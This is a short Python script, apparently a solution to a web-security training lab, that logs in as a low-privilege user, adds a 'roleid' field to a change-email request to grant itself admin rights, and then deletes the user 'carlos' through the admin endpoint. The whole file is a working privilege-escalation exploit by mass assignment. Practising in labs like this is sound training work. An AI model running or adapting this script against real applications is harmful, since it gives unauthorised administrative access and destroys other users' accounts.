import requests
import sys

def main(base_url):
    session = requests.Session()

    login_data = {
        'username': 'wiener',
        'password': 'peter'
    }
    response = session.post(base_url + '/login', data=login_data)

    if response.status_code != 200:
        print("Login failed")
        sys.exit(1)

    change_email_url = base_url + '/my-account/change-email'
    change_email_json = {
        'email': 'b@a.com',
        'roleid': 2
    }
    response = session.post(change_email_url, json=change_email_json)

    if response.status_code != 200:
        print("Change email failed")
        sys.exit(1)

    delete_user_url = base_url + '/admin/delete?username=carlos'
    response = session.get(delete_user_url)

    if response.status_code != 200:
        print("Delete user failed")
        sys.exit(1)

    print("Operations completed successfully")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    base_url = sys.argv[1]
    main(base_url)
